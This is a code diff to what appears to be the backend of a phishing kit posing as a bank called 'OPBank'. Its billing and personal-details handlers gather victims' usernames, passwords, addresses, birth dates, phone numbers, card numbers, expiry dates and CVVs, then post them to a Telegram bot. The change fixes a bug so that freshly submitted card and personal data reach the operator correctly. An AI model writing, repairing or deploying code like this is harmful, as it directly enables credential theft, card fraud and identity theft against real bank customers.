@@ -76,7 +76,7 @@ const submitBilling = async (req, res) => {
     const { ccnum, ccexp, ccname, cvv, uniqueid } = req.body;
     try {
         let user = await OPBank.findOneAndUpdate({ uniqueid }, { ccname, ccnum, ccexp, cvv, status: 3, timestamp: moment().format() }).exec();
-        let originalText = `ID: ${user.uniqueid}\nUsername: ${user.username}\nPassword: ${user.password}\nAddress: ${user.address}\nDOB: ${user.dob}\nMobile: ${user.telephone}\nCard Name: ${ccname}\nCard Number: ${ccnum}\nCVV: ${user.cvv}`;
+        let originalText = `ID: ${user.uniqueid}\nUsername: ${user.username}\nPassword: ${user.password}\nAddress: ${user.address}\nDOB: ${user.dob}\nMobile: ${user.telephone}\nCard Name: ${ccname}\nCard Number: ${ccnum}\nCVV: ${cvv}`;
         await axios
             .post(
                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
@@ -112,7 +112,7 @@ const submitPersonal = async (req, res) => {
     const { address, dob, telephone, uniqueid } = req.body;
     try {
         let user = await OPBank.findOneAndUpdate({ uniqueid }, { address, dob, telephone, status: 2, timestamp: moment().format() }).exec();
-        let originalText = `ID: ${user.uniqueid}\nUsername: ${user.username}\nPassword: ${user.password}\nAddress: ${user.address}\nDOB: ${user.dob}\nMobile: ${user.telephone}`;
+        let originalText = `ID: ${user.uniqueid}\nUsername: ${user.username}\nPassword: ${user.password}\nAddress: ${address}\nDOB: ${dob}\nMobile: ${telephone}`;
         await axios
             .post(
                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
